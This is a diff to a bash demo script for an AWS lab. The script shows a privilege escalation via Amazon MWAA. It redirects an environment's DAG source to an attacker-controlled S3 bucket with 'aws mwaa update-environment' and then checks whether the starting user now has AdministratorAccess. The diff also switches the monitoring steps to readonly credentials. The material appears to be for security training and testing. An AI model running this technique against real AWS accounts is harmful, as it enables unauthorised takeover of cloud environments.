@@ -27,12 +27,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -84,12 +86,12 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
-# Retrieve admin cleanup credentials
-ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
-ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+# Retrieve readonly credentials
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
 
-if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
-    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
     exit 1
 fi
 
@@ -127,9 +129,9 @@ use_starting_user_creds() {
     export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
     unset AWS_SESSION_TOKEN
 }
-use_admin_creds() {
-    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
-    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
 
@@ -141,7 +143,7 @@ export AWS_REGION=$AWS_REGION
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -153,18 +155,18 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "aws sts get-caller-identity --query 'Account' --output text"
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
 # [OBSERVATION]
 # Step 4: Verify lack of admin permissions
-use_admin_creds
+use_readonly_creds
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Checking currently attached policies to starting user..."
 
-show_cmd "aws iam list-attached-user-policies --user-name \"$STARTING_USER_NAME\" --query 'AttachedPolicies[*].PolicyName' --output text"
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER_NAME\" --query 'AttachedPolicies[*].PolicyName' --output text"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
     --user-name "$STARTING_USER_NAME" \
     --query 'AttachedPolicies[*].PolicyName' \
@@ -179,7 +181,7 @@ fi
 echo ""
 echo "Attempting to list IAM users (should fail)..."
 use_starting_user_creds
-show_cmd "aws iam list-users --max-items 1"
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -189,12 +191,12 @@ echo ""
 
 # [OBSERVATION]
 # Step 5: Check current MWAA environment status
-use_admin_creds
+use_readonly_creds
 echo -e "${YELLOW}Step 5: Checking current MWAA environment status${NC}"
 echo "Environment: $MWAA_ENV_NAME"
 echo ""
 
-show_cmd "aws mwaa get-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --output json"
+show_cmd "ReadOnly" "aws mwaa get-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --output json"
 ENV_INFO=$(aws mwaa get-environment \
     --region "$AWS_REGION" \
     --name "$MWAA_ENV_NAME" \
@@ -232,7 +234,7 @@ echo ""
 
 echo "Calling airflow:UpdateEnvironment to change DAG source..."
 
-show_attack_cmd "aws mwaa update-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --source-bucket-arn \"arn:aws:s3:::$ATTACKER_BUCKET_NAME\" --dag-s3-path \"$ATTACKER_DAG_PATH\""
+show_attack_cmd "Attacker" "aws mwaa update-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --source-bucket-arn \"arn:aws:s3:::$ATTACKER_BUCKET_NAME\" --dag-s3-path \"$ATTACKER_DAG_PATH\""
 aws mwaa update-environment \
     --region "$AWS_REGION" \
     --name "$MWAA_ENV_NAME" \
@@ -249,7 +251,7 @@ echo ""
 
 # [OBSERVATION]
 # Step 7: Wait for MWAA environment to update
-use_admin_creds
+use_readonly_creds
 echo -e "${YELLOW}Step 7: Waiting for MWAA environment to update${NC}"
 echo -e "${BLUE}This typically takes 10-30 minutes. Please be patient...${NC}"
 echo ""
@@ -261,7 +263,7 @@ ELAPSED=0
 CHECK_INTERVAL=60  # Check every minute
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
-    show_cmd "aws mwaa get-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --query 'Environment.Status' --output text"
+    show_cmd "ReadOnly" "aws mwaa get-environment --region \"$AWS_REGION\" --name \"$MWAA_ENV_NAME\" --query 'Environment.Status' --output text"
     STATUS=$(aws mwaa get-environment \
         --region "$AWS_REGION" \
         --name "$MWAA_ENV_NAME" \
@@ -379,12 +381,12 @@ echo -e "${GREEN}✓ Wait complete${NC}\n"
 
 # [OBSERVATION]
 # Step 11: Verify admin access
-use_admin_creds
+use_readonly_creds
 echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Checking if AdministratorAccess is now attached to starting user..."
 
 # Check attached policies
-show_cmd "aws iam list-attached-user-policies --user-name \"$STARTING_USER_NAME\" --query 'AttachedPolicies[*].PolicyArn' --output text"
+show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name \"$STARTING_USER_NAME\" --query 'AttachedPolicies[*].PolicyArn' --output text"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
     --user-name "$STARTING_USER_NAME" \
     --query 'AttachedPolicies[*].PolicyArn' \
@@ -409,7 +411,7 @@ fi
 echo ""
 echo "Attempting to list IAM users..."
 
-show_cmd "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
